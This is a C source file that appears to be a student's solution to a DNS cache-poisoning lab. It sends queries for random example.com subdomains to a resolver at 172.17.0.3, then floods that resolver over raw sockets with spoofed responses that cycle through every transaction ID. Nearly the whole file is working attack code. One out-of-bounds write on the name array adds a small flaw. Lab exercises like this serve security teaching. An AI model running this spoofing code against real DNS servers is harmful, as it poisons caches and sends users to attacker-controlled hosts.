#include <stdlib.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <time.h>
#include <errno.h>

#define MAX_FILE_SIZE 1000000

/* IP Header */
struct ipheader
{
    unsigned char iph_ihl : 4,       // IP header length
        iph_ver : 4;                 // IP version
    unsigned char iph_tos;           // Type of service
    unsigned short int iph_len;      // IP Packet length (data + header)
    unsigned short int iph_ident;    // Identification
    unsigned short int iph_flag : 3, // Fragmentation flags
        iph_offset : 13;             // Flags offset
    unsigned char iph_ttl;           // Time to Live
    unsigned char iph_protocol;      // Protocol type
    unsigned short int iph_chksum;   // IP datagram checksum
    struct in_addr iph_sourceip;     // Source IP address
    struct in_addr iph_destip;       // Destination IP address
};

void send_raw_packet(char *buffer, int pkt_size);
void send_dns_request();
void send_dns_response();


int main()
{
    long i = 0;

    srand(time(NULL));

    // Load the DNS request packet from file
    FILE *f_req = fopen("ip_req.bin", "rb");
    if (!f_req)
    {
        perror("Can't open 'ip_req.bin'");
        exit(1);
    }
    unsigned char ip_req[MAX_FILE_SIZE];
    int n_req = fread(ip_req, 1, MAX_FILE_SIZE, f_req);

    // Load the first DNS response packet from file
    FILE *f_resp = fopen("ip_resp.bin", "rb");
    if (!f_resp)
    {
        perror("Can't open 'ip_resp.bin'");
        exit(1);
    }
    unsigned char ip_resp[MAX_FILE_SIZE];
    int n_resp = fread(ip_resp, 1, MAX_FILE_SIZE, f_resp);

    char a[26] = "abcdefghijklmnopqrstuvwxyz";

    struct sockaddr_in dest_query;
    struct sockaddr_in dest_response;
    memset(&dest_query, 0, sizeof(dest_query));
    memset(&dest_response, 0, sizeof(dest_response));
    int enable = 1;
    // Create a raw socket
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable))<0){
        printf("exit\n");
        return;
    }
    // Destination info for the query
    dest_query.sin_family = AF_INET;
    dest_query.sin_addr.s_addr = inet_addr("172.17.0.3");
    dest_query.sin_port = htons(53);

    // Destination info for the response
    dest_response.sin_family = AF_INET;
    dest_response.sin_addr.s_addr = inet_addr("172.17.0.3");
    dest_response.sin_port = htons(33333);

    int x = 0;
    while (1)
    {
        unsigned short transaction_id = 0;

        // Generate a random name with length 5
        char name[5];
        for (int k = 0; k < 5; k++)
            name[k] = a[rand() % 26];
        name[5] = '\0';

        printf("attempt #%ld. request is [%s.example.com], transaction ID is: [%hu]\n",
               ++i, name, transaction_id);

        //##################################################################
        /* Step 1. Send a DNS request to the targeted local DNS server
                  This will trigger it to send out DNS queries */
        // req
        memcpy(ip_req + 41, name, 5);

        // Step 2. Send spoofed responses to the targeted local DNS server.

        //##################################################################
        memcpy(ip_resp + 41, name, 5);
        memcpy(ip_resp + 64, name, 5);
        errno = 0;
        int t = sendto(sock, ip_req, n_req, 0, (struct sockaddr *)&dest_query, sizeof(dest_query));
        if (t < 0)
        {
            printf("Sending query error %d errno: %d\n", t, errno);
            close(sock);
            return;
        }
        else
        {
            for (int count = 1; count < 65535; count++)
            {
                unsigned short id[2];
                *id = htons(count);
                memcpy(ip_resp + 28, (void *)id, 2);
                if (sendto(sock, ip_resp, n_resp, 0, (struct sockaddr *)&dest_response, sizeof(dest_response)) < 0)
                {
                    printf("Sending response error");
                    close(sock);
                    return;
                }
            }
            printf("sent request %d\n", x);
        }
        x++;
    }
}

/* Use for sending DNS request.
 * Add arguments to the function definition if needed.
 * */
void send_dns_request()
{
    // Students need to implement this function
}

/* Use for sending forged DNS response.
 * Add arguments to the function definition if needed.
 * */
void send_dns_response()
{
    // Students need to implement this function
}

/* Send the raw packet out
 *    buffer: to contain the entire IP packet, with everything filled out.
 *    pkt_size: the size of the buffer.
 * */
void send_raw_packet(char *buffer, int pkt_size)
{
    struct sockaddr_in dest_info;
    int enable = 1;

    // Step 1: Create a raw network socket.
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

    // Step 2: Set socket option.
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL,
               &enable, sizeof(enable));

    // Step 3: Provide needed information about destination.
    struct ipheader *ip = (struct ipheader *)buffer;
    dest_info.sin_family = AF_INET;
    dest_info.sin_addr = ip->iph_destip;

    // Step 4: Send the packet out.
    sendto(sock, buffer, pkt_size, 0,
           (struct sockaddr *)&dest_info, sizeof(dest_info));
    close(sock);
}
